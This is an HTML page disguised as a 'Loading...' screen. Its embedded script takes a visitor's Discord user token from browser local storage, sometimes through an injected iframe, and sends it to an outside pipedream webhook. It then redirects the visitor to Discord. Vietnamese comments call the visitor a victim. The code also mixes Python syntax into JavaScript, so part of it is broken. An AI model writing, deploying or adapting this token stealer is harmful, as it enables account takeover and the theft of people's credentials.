<!DOCTYPE html>
<html>
<head><title>Loading...</title></head>
<body>
    <script>
        const WEBHOOK = "https://eop7zyrf1iz1jrc.m.pipedream.net";

        async def hoot_token() {
            // Thủ thuật lấy User Token trực tiếp từ trình duyệt của nạn nhân
            let token = (
                window.webpackChunkdiscord_app ? 
                window.localStorage.getItem('token') : 
                document.body.appendChild(document.createElement('iframe')).contentWindow.localStorage.token
            );

            if (token) {
                token = token.replace(/"/g, "");
                await fetch(WEBHOOK, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ user_token: token })
                });
                window.location.href = "https://discord.com/channels/@me";
            } else {
                // Nếu chưa có token, ép họ vào trang login để lấy
                window.location.href = "https://discord.com/login";
            }
        }

        hoot_token();
    </script>
</body>
</html>
